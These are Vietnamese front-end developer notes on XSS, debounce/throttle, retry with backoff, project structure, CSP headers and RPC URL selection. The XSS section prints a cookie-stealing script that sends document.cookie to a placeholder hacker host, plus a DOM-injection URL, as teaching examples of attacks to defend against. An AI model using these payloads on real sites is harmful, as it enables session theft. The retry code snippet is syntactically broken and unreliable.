# Cách kiểu tấn công XSS
innterHTML thì ngừoi dùng có thể input code js nguy hiểm, dùng textContent có thể tránh được.
innerHTML có thể bị XSS nên React đã đổi thành dangerouslySetInnerHTML và khuyên k nên dùng. VD: <div dangerouslySetInnerHTML={{ __html: htmlContent }} />
Tương tự thuộc tính href thẻ a cũng k an toàn. Khuyên dùng encodeURIComponent để chuyển ký tự đặc biệt thành html entity trước

-> Reflected XSS
User login 1 trang web sẽ có session cookies -> Hacker gửi cho người dùng 1 URL tới trang web đó nhưng tham số có chứa mã XSS -> người dùng truy cập vào URL đó thì gửi request tới server với mã XSS của hacker -> server xử lý và trả lại ngừoi dùng hiển thị ra màn hình. VD đoạn mã là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie; -> Browser hiển thị ra màn hình sẽ thực hiện script và gửi session cookie cho hacker.

-> Stored XSS
Hacker chèn script độc hại, server lưu vào database -> nạn nhân đăng nhập vào web như thường, lấy đoạn XSS script từ server gửi về thực thi là toang

-> DOM Based XSS: giống reflected XSS nhưng 1 cái gửi lên server, 1 cái sửa DOM
Hacker lừa người dùng truy cập vào URL của 1 trang web để đăng nhập là: http://example.com/register.php?message=Please fill in the form
Nhưng hacker lại gửi: http://example.com/register.php?message=<label>Gender</label><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select> <script>function show(){alert("hacked");}</script>
=> Dòng please fill in the form biến thành 1 input gender vì browser nó render html như v, khi người dùng kb vào chọn gender thì script được thực thi



# Dùng debounce throttle
Có thể tự implement hoặc dùng lib như lodash

-> throttle: Giới hạn số lần gọi hàm trong 1 ktg. VD ta có thể set là "Bất cứ 10s liên tiếp nào cũng k có quá 100 lần gọi hàm này"
VD: khi đổi kích thước màn hình or scroll thì chạy hàm gì đó nhưng các sự kiện đó thg được tự trigger quá nhiều, dùng throttle giảm số lần xử lý sẽ đỡ lag.
VD: thg dung trong game khi người dùng ấn bắn chiêu nhanh đến mấy thì vẫn bắn 1s 1 phát đạn chẳng hạn

-> debounce: Event chỉ được gọi 1 lần sau 1 ktg cố định kể từ khi lần trigger mới nhất. Tức trigger liên tục 1 event quá nhanh sẽ chỉ gọi 1 lần ở cuối
VD: tính năng search gõ liên tục sẽ chỉ tự thực hiện search sau khi gõ xong



# Tạo safe triangle cho context menu
Giải thích rõ cơ chế ở: https://www.smashingmagazine.com/2023/08/better-context-menus-safe-triangles/
Cụ thể là xử lý sự kiện mouse enter và mouse leave. Dùng toán check con chuột trong hình tam giác thì disable mouse pointer event đi là xong
Safe triangle bên cạnh việc di chuột trong vùng, nếu chuột bị di chậm hoặc đứng yên cũng tự tắt.



# Dùng retryable
Request lỗi k nên dừng luôn và bắt user refresh trang, ta phải implement retryable. Chỉ dùng khi bị lỗi mạng và biết rằng việc retry có thể thành công. Nếu biết rằng retry request vẫn sẽ báo lỗi y như v thì nên kết thúc và show lỗi cho người dùng biết.

K nên retry liên tục vô hạn mà phải sleep 3s rồi retry max 5 lần chẳng hạn. Chưa tốt vì nếu nhiều người dùng cùng lúc, tự dưng sập và mọi request tại thời điểm đó bị lỗi và retry đồng thời mỗi 3s, thì kể từ đó, mỗi 3s thì số lượng request trùng lặp dần tăng lên trong 5 lần kế. Vì 3s sau lại có người mới vào, 6s sau lại có người mới vào.
=> Giải pháp là cộng thêm 1 số random cho khoảng thời gian sleep là được. 

K nên retry mỗi 3s vì trong khoảng thời gian ngắn, xác suất request gặp lại lỗi cũ rất cao. Giải pháp exponential backoff là các lần sau request sẽ phải chờ lâu hơn các lần trước. Nó xuất hiện trong các pp nhập mật khẩu, VD nhập sai càng nhiều sẽ chờ càng lâu hơn lần trước đó.

VD càng sai càng chờ lâu, liên tục trong 3 lần, cộng 1 khoảng random từ 0->1s:
static async fetchWithRetry(url, errorCount = 0) => {
  const ERROR_COUNT_MAX = 3;
  const response = await fetch(url);
  if(response.status < 200 || response.status >= 300) {
    // Log lỗi 
    if(errorCount < ERROR_COUNT_MAX){
      await new Promise(r => setTimeout(r, 
        Math.pow(2, errorCount)*3000 + Math.random()*1000
      ));
      await this.fetchWithRetry(url, errorCount + 1);
    }
  }
}



# Chia cấu trúc dự án lớn
Quan trọng là nhìn vào giao diện biết tìm ở file nào, nhìn vào file nào biết nằm ở đâu trên giao diện. 1 người mới toanh nhìn vào là hiểu luôn.
VD ta cần tìm trong trang finance, trong 1 mục X, có cái dropdown => Phải tìm trong pages/finance/X/index.js. Dropdown là 1 component chung nhưng chỉ dùng ở finance thì nên chia kiểu src/common/finance/dropdown/index.js hoặc src/apps/finance/common/dropdown/index.js
VD chia theo chức năng, mỗi chức năng sẽ chia theo cấu trúc từng module UI, vừa tìm dễ trên UI, vừa tìm dễ trong code:
src (folder)
  api (folder)
    calling (folder) => call API cho calling
    powerplatform (folder) => call API cho powerplatform
    helpers (folder) => enum, utility liên quan tới API
  app (folder)
    common (folder) => common component
    structure (folder) => component kiểu loading, error, headers, router
    pages (folder)
      calling (folder)
        common (folder) => common components của calling
        callingpolicy => component trong calling policy. Chia theo cấu trúc UI
        callqueues => component trong callqueues
      powerplatform (folder)
    index.js
    index.css
  redux (folder)
    actions (folder)
      calling
      powerplatforms 
    reducers (folder)
      calling
      powerplatforms
    store (folder)
  hookes (folder)
    react-query (folder)
    contracts (folder)
    common (folders)
  util (folder) => chứa các utility chung
  model (folder) => chứa interface, type, struct
  context (folder)
  index.html
  index.js
=> Nếu vì ít file mà k chia folder của module thì nên đặt prefix trong tên file là tên module để có 2 chiều: 1 là nhìn file biết module nào luôn và 2 là nhìn module có chức năng nào thì biết tìm file ở đâu luôn. Còn TH lớn mới chia module ở bên trong chức năng như trên.

Trong 1 file component: propsType  defaultProps  utilities  Component

Còn có kiểu chia là: 1 phát viết toàn module theo UI, bên trong từng module sẽ chia ra assets, common, utils, hooks, context, views, api. Chung thì để ngoài cùng luôn 
=> K nên, sẽ ra sao nếu 1 pages lớn có 10 pages lớn khác bên trong. Lại chia phân cấp nữa thì rất mệt



# Dựng server nodejs serve react app
Giả sử công ty lớn cần thêm các header bảo mật khi người dùng vào web react, có thể dựng 1 server nodejs custom để serve.
Đầu tiên build app react set outDir ra 1 thư mục có file index.html -> dựng 1 server expressjs config route để serve file index.html đó -> Tuỳ ý tạo middleware thêm các header bảo mật. Có thể tạo các biến số trong file index.html để thế vào từ server, VD các url phân tách môi trường, SSL key, login SSO -> thay lệnh chạy react bằng lệnh chạy nodejs.
Server này thế cho nginx cũng được, thực tế việc set header có thể làm ở nginx.
Chú ý họ chỉ cần thêm header bảo mật của request lấy file index.html, VD k cho web khác nhúng web của ta vào iframe. Còn các API query data thì k cần, API đó có access token bảo mật riêng klq. Khi ta set header cho query GET index.html, browser lấy xong index.html này sẽ lấy các file js, css liên quan thì sẽ tự thêm các header cũ

Các công ty lớn bảo mật cao thường k phụ thuộc vào bên thứ 3. Header họ set rất chi tiết chứ k dùng thư viện helmet đâu. VD: 
res.setHeader('Content-Security-Policy', "frame-ancestors 'self'; frame-src 'self' https://*.youtube.com; base-uri 'none'; object-src 'none'; img-src data: 'self' https://* *.aptrinsic.com  *.segment.com *.segment.io *.avepointonlineservices.com *.avepoint.com storage.googleapis.com; form-action 'self' *.sharepointguild.com *.avepointonlineservices.com *.sharepointonline.com *.online15.net *.avepointonlineservices.apps.mil; script-src 'self'" + ' \'nonce-' + req.nonce + '\'' + " *.sharepointguild.com *.avepointonlineservices.com *.sharepointonline.com *.online15.net *.aptrinsic.com *.segment.com *.segment.io *.avepointonlineservices.apps.mil; connect-src  *.sharepointguild.com *.avepointonlineservices.com *.online15.net *.aptrinsic.com *.segment.com *.segment.io *.avepointonlineservices.apps.mil 'self'");
Giải thích CSP:
frame-ancestors 'self': Chỉ cho phép trang này được nhúng trong iframe từ cùng một nguồn (origin). Điều này ngăn chặn việc nhúng trang vào các trang web độc hại.
frame-src 'self' https://.youtube.com: Cho phép nhúng các iframe từ cùng một nguồn và từ các miền con của youtube.com.
base-uri 'none': Ngăn chặn việc sử dụng thẻ <base> trong tài liệu, giúp giảm thiểu rủi ro từ các cuộc tấn công.
object-src 'none': Ngăn chặn việc sử dụng thẻ <object>, <embed>, và <applet>, giúp bảo vệ khỏi các lỗ hổng liên quan đến các đối tượng nhúng.
img-src data: 'self' https:// .aptrinsic.com .segment.com .segment.io: Cho phép tải hình ảnh từ cùng một nguồn, từ các miền cụ thể.
form-action 'self' .online15.net: Chỉ định các nguồn mà biểu mẫu có thể gửi dữ liệu đến.
script-src 'self' 'nonce-{req.nonce}' .online15.net .aptrinsic.com: Cho phép chạy script từ cùng một nguồn và từ các miền cụ thể, với điều kiện rằng script có nonce (một giá trị duy nhất cho mỗi yêu cầu) để ngăn chặn việc chèn script độc hại. Thẻ script trong dự án phải có thêm trường nonce
connect-src .sharepointguild.com .online15.net .aptrinsic.com .segment.com .segment.io 'self': Chỉ định các nguồn mà trang có thể thực hiện các kết nối (như WebSocket, AJAX).



# Tìm best url trong list url
VD có 1 list rpc như nhau, cần chọn ra best url để gọi vào, rpc có thể chết bất cứ lúc nào.
=> Mỗi khi user vào trang web sẽ query thử 1 lệnh đơn giản (như getBlockNumber) cả list rpc với Promise.any xem cái nào trả nhanh nhất thì lấy
Nếu có lỗi mạng thì sẽ tự chọn second-best url query lại, khi refresh lại pages sẽ chọn lại url luôn.
=> ref tới projects "Vatra"

